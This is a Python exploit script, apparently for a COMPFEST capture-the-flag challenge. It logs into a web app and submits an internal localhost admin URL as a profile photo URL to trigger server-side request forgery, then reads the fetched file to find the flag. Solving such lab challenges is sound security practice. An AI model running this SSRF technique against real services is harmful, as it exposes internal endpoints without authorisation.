#!/usr/bin/env python3
import requests

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def register_and_login():
    """Register a new user and login"""
    username = "check_user"
    password = "check123"
    
    # Register
    data = {'username': username, 'password': password}
    requests.post(f"{BASE_URL}/register", data=data)
    
    # Login
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code == 302:
        return response.cookies, username
    return None, None

def check_upload():
    """Check what was uploaded and try to access it"""
    print("[+] Checking uploaded content...")
    
    # Get session
    cookies, username = register_and_login()
    if not cookies:
        print("[-] Failed to login!")
        return
    
    print(f"[+] Successfully logged in as: {username}")
    
    # First, trigger the SSRF to upload content
    url = "http://127.0.0.1:5000/internal/admin/search"
    
    print(f"\n[*] Triggering SSRF with: {url}")
    
    data = {'photo_url': url}
    
    try:
        response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
        
        if response.status_code == 200:
            print("[+] SSRF request successful!")
            
            # Now try to access the uploaded file
            upload_path = f"uploads/{username}_profile_fetched"
            upload_url = f"{BASE_URL}/static/{upload_path}"
            
            print(f"[*] Trying to access uploaded file: {upload_url}")
            
            file_response = requests.get(upload_url, cookies=cookies)
            
            print(f"[+] File access status: {file_response.status_code}")
            print(f"[+] File content type: {file_response.headers.get('Content-Type', 'Not set')}")
            
            if file_response.status_code == 200:
                content = file_response.text
                print(f"[+] File content: {content}")
                
                # Look for the flag
                if "COMPFEST" in content:
                    print("[+] SUCCESS! Found flag in uploaded file!")
                    return
                elif "Flag" in content or "welcome_note" in content or "author_message" in content:
                    print(f"[+] Found interesting content: {content}")
                    return
            else:
                print(f"[-] Failed to access file: {file_response.text[:200]}")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    check_upload()
